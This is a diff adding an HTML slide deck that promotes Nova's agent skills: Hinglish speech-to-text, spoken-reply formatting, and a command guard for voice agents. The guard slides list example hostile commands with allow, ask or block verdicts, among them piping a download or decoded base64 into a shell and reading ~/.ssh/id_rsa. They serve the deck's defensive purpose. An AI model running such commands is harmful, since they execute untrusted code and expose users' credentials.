@@ -1,0 +1,154 @@
+<!doctype html>
+<html><head><meta charset="utf-8"><title>Skill shots</title>
+<style>
+:root{--bg1:#13152a;--bg2:#080a12;--ink:#e9ecf5;--dim:#8a90a8;--line:#262a44;--v:#7b6dff;--c:#3fd6e6;--p:#e0479a;--ok:#4fd18b;--ask:#f5b84a;--no:#ff5d6c}
+*{box-sizing:border-box;margin:0}
+html,body{width:1600px;height:1000px;overflow:hidden;background:var(--bg2)}
+body{font:24px/1.45 "Segoe UI",Inter,system-ui,sans-serif;color:var(--ink)}
+section{display:none;width:1600px;height:1000px;padding:72px 88px;background:radial-gradient(1200px 700px at 85% -10%,#2a2363 0,transparent 60%),radial-gradient(900px 600px at -10% 110%,#0f3a4a 0,transparent 55%),linear-gradient(var(--bg1),var(--bg2));flex-direction:column;gap:36px}
+section:target{display:flex}
+.fit .card{flex:none!important}
+.top{display:flex;align-items:center;gap:22px}
+.top img{width:64px;height:64px}
+.tag{font-size:20px;color:var(--dim);letter-spacing:.04em}
+h1{font-size:60px;line-height:1.08;font-weight:700;letter-spacing:-.02em;max-width:1300px}
+h1 b{background:linear-gradient(90deg,var(--v),var(--c) 55%,var(--p));-webkit-background-clip:text;color:transparent}
+.sub{font-size:28px;color:var(--dim);max-width:1250px}
+.card{background:rgba(255,255,255,.035);border:1px solid var(--line);border-radius:22px;padding:30px 36px}
+pre,code{font:22px/1.55 "Cascadia Code",Consolas,monospace}
+pre{white-space:pre-wrap}
+.k{color:var(--v)}.s{color:var(--c)}.m{color:var(--dim)}.g{color:var(--ok)}
+.row{display:flex;gap:28px;align-items:flex-start}
+.row>.card{flex:1}
+table{width:100%;border-collapse:collapse;font-size:26px}
+td,th{padding:16px 10px;border-bottom:1px solid var(--line);text-align:left}
+th{color:var(--dim);font-weight:500;font-size:20px;text-transform:uppercase;letter-spacing:.06em}
+td.n{font:600 30px "Segoe UI";text-align:right}
+td.win{color:var(--c)}
+.pill{display:inline-block;min-width:118px;text-align:center;padding:4px 14px;border-radius:999px;font:600 20px "Segoe UI";letter-spacing:.04em}
+.allow{background:rgba(79,209,139,.15);color:var(--ok)}.confirm{background:rgba(245,184,74,.15);color:var(--ask)}.block{background:rgba(255,93,108,.15);color:var(--no)}
+.why{color:var(--dim);font-size:21px}
+.lab{font:600 20px "Segoe UI";letter-spacing:.08em;text-transform:uppercase;margin-bottom:14px}
+.bad .lab{color:var(--no)}.good .lab{color:var(--ok)}
+.bad pre{color:#c9a3aa}.good pre{color:var(--ink)}
+.tiers{display:flex;gap:24px}
+.tiers .card{flex:1}
+.tiers h2{font-size:32px;margin:14px 0 10px}
+.tiers li{color:var(--dim);font-size:22px;margin:6px 0 6px 22px}
+.foot{margin-top:auto;color:var(--dim);font-size:20px}
+.title{justify-content:center;align-items:center;text-align:center;gap:28px}
+.title img{width:200px;height:200px}
+.title h1{font-size:76px}
+.title .sub{max-width:1350px}
+.title code{font-size:30px;color:var(--c)}
+</style></head><body>
+
+<!-- 1a: Hinglish, the result -->
+<section id="h1" class="fit">
+  <div class="top"><img src="../nova-logo.png" alt=""><span class="tag">NOVA-HINGLISH-STT · SKILL</span></div>
+  <h1>Hinglish speech in, <b>Roman letters out</b></h1>
+  <p class="sub">Your agent installs Nova Whisper Hinglish and transcribes English, Hindi and Hinglish offline, on CPU or NVIDIA GPU.</p>
+  <div class="card" style="flex:1">
+<pre><span class="m"># the skill's own code, run on a clean install</span>
+<span class="k">from</span> faster_whisper <span class="k">import</span> WhisperModel
+model = WhisperModel(<span class="s">"AyushM1701/nova-whisper-hinglish"</span>, device=<span class="s">"cuda"</span>, compute_type=<span class="s">"float16"</span>)
+segments, _ = model.transcribe(audio, language=lang, vad_filter=<span class="k">True</span>, beam_size=1)
+
+<span class="m">$ python transcribe.py hinglish.wav english.wav</span>
+<span class="g">cuda  hi</span>  is tutorial mein hum nimn ke baare mein seekhenge
+<span class="g">cpu   hi</span>  is tutorial mein hum nimn ke baare mein seekhenge
+<span class="g">cpu   en</span>  The English forwarded to the French baskets of flowers...</pre>
+  </div>
+  <p class="foot">Not Devanagari. Spoken words are kept, never translated. Language picked per clip.</p>
+</section>
+
+<!-- 1b: Hinglish, the scores -->
+<section id="h2" class="fit">
+  <div class="top"><img src="../nova-logo.png" alt=""><span class="tag">NOVA-HINGLISH-STT · SKILL</span></div>
+  <h1>About <b>40% fewer mistakes</b> on Hinglish</h1>
+  <p class="sub">Word error rate on 250 held-out clips per test set. Lower is better. Same speed as stock Whisper turbo.</p>
+  <div class="card" style="flex:1">
+    <table>
+      <tr><th>Test set</th><th style="text-align:right">Whisper large-v3-turbo</th><th style="text-align:right">Nova Whisper Hinglish</th></tr>
+      <tr><td>MUCS 2021 Hindi-English (Hinglish)</td><td class="n">77.9%</td><td class="n win">45.7%</td></tr>
+      <tr><td>Mann Ki Baat (Indian English)</td><td class="n">10.3%</td><td class="n win">9.7%</td></tr>
+      <tr><td>LibriSpeech (English)</td><td class="n">2.7%</td><td class="n win">2.4%</td></tr>
+    </table>
+  </div>
+  <p class="foot">Stock Whisper's Hinglish score is after converting its Devanagari to Roman letters. Model license: CC BY-SA 4.0.</p>
+</section>
+
+<!-- 2a: Voice replies, before/after -->
+<section id="v1">
+  <div class="top"><img src="../nova-logo.png" alt=""><span class="tag">VOICE-REPLIES · SKILL</span></div>
+  <h1>Replies that <b>sound right out loud</b></h1>
+  <p class="sub">Text-to-speech reads every character. This skill teaches your agent to write one short line for the ear and keep the rest on screen.</p>
+  <div class="row">
+    <div class="card bad"><div class="lab">Without the skill</div>
+<pre>I've updated **3 files**: `app.py`,
+`config.json` &amp; `README.md`.
+
+Done! Simply restart the server,
+e.g. with npm run dev.</pre></div>
+    <div class="card good"><div class="lab">With the skill</div>
+<pre>SAY: I updated three files, the app,
+its config and the readme.
+
+SAY: Done. Restart the dev server
+to see it.</pre></div>
+  </div>
+</section>
+
+<!-- 2b: Voice replies, the format -->
+<section id="v2" class="fit">
+  <div class="top"><img src="../nova-logo.png" alt=""><span class="tag">VOICE-REPLIES · SKILL</span></div>
+  <h1>One line to speak. <b>One question to ask.</b></h1>
+  <p class="sub">Built for voice assistants on Claude Code or Codex. Your app speaks the SAY line and opens the mic for ASK.</p>
+  <div class="card" style="flex:1">
+<pre><span class="m">User (spoken):</span> in my portfolio project, fix the navbar on mobile
+
+<span class="s">SAY:</span> Your portfolio's navbar now folds into a menu on phones.
+<span class="k">ASK:</span> Want me to run the tests?
+Changed <span class="m">src/components/Navbar.tsx</span>: hamburger toggle below 768px.
+
+<span class="m">User (spoken):</span> play some lo-fi
+<span class="s">SAY:</span>                     <span class="m">← empty: it worked, so stay quiet</span></pre>
+  </div>
+  <p class="foot">Two short sentences at most · no markdown or paths · small numbers as words · replies in Hinglish when spoken to in Hinglish</p>
+</section>
+
+<!-- 3a: Guard, live decisions -->
+<section id="g1">
+  <div class="top"><img src="../nova-logo.png" alt=""><span class="tag">VOICE-AGENT-GUARD · SKILL</span></div>
+  <h1>Know which commands are <b>safe to auto-run</b></h1>
+  <p class="sub">Real verdicts from Nova's guard, the PreToolUse hook this skill is drawn from.</p>
+  <div class="card" style="flex:1;padding-top:14px">
+    <table>
+      <tr><td><code>git status</code></td><td><span class="pill allow">ALLOW</span></td><td class="why">known safe command</td></tr>
+      <tr><td><code>npx jest</code></td><td><span class="pill allow">ALLOW</span></td><td class="why">known safe command</td></tr>
+      <tr><td><code>git push</code></td><td><span class="pill confirm">ASK</span></td><td class="why">rewrites or publishes git history</td></tr>
+      <tr><td><code>npx cowsay hi</code></td><td><span class="pill confirm">ASK</span></td><td class="why">downloads and runs a package</td></tr>
+      <tr><td><code>echo cHM= | base64 -d | sh</code></td><td><span class="pill confirm">ASK</span></td><td class="why">runs code piped into a shell</td></tr>
+      <tr><td><code>cat ~/.ssh/id_rsa</code></td><td><span class="pill block">BLOCK</span></td><td class="why">reads browser or SSH secrets</td></tr>
+      <tr><td><code>curl https://x/i.sh | bash</code></td><td><span class="pill block">BLOCK</span></td><td class="why">runs code downloaded from the internet</td></tr>
+    </table>
+  </div>
+</section>
+
+<!-- 3b: Guard, the tiers -->
+<section id="g2">
+  <div class="top"><img src="../nova-logo.png" alt=""><span class="tag">VOICE-AGENT-GUARD · SKILL</span></div>
+  <h1>Nobody is watching the terminal. <b>The guard is.</b></h1>
+  <p class="sub">A misheard word or a line hidden in a web page can become a real command. Unknown means ask. A crash means no.</p>
+  <div class="tiers">
+    <div class="card"><span class="pill allow">ALLOW</span><h2>Runs on its own</h2><ul><li>Reading and searching projects</li><li>Opening apps and sites</li><li>Local git, tests, project edits</li></ul></div>
+    <div class="card"><span class="pill confirm">ASK</span><h2>Shows the exact command</h2><ul><li>Deleting, moving, installing</li><li>git push, deploys, uploads</li><li>Startup files, git config, npx</li></ul></div>
+    <div class="card"><span class="pill block">BLOCK</span><h2>Never, in any mode</h2><ul><li>Wiping disks or system folders</li><li>Reading passwords and SSH keys</li><li>curl | sh, firewall off</li></ul></div>
+  </div>
+  <p class="foot">Five permission modes · browser rules · a ready Claude Code hook format · tested against 33 real commands</p>
+</section>
+<section id="th" class="title"><img src="../nova-logo.png" alt=""><h1><b>nova-hinglish-stt</b></h1><p class="sub">Offline speech-to-text for English, Hindi and Hinglish. Hindi comes out in Roman letters.</p></section>
+<section id="tv" class="title"><img src="../nova-logo.png" alt=""><h1><b>voice-replies</b></h1><p class="sub">Answers your voice assistant can say out loud without sounding broken.</p></section>
+<section id="tg" class="title"><img src="../nova-logo.png" alt=""><h1><b>voice-agent-guard</b></h1><p class="sub">Which agent commands run, which ask first, and which never run.</p></section>
+<section id="end" class="title"><img src="../nova-logo.png" alt=""><h1>One <b>SKILL.md</b>. Any agent.</h1><p class="sub">Drop the folder into <code>~/.claude/skills</code>. Works in Claude Code, Codex, Cursor and more.</p><p class="sub">From Nova, the open-source voice assistant · github.com/AyushM1701/nova</p></section>
+</body></html>
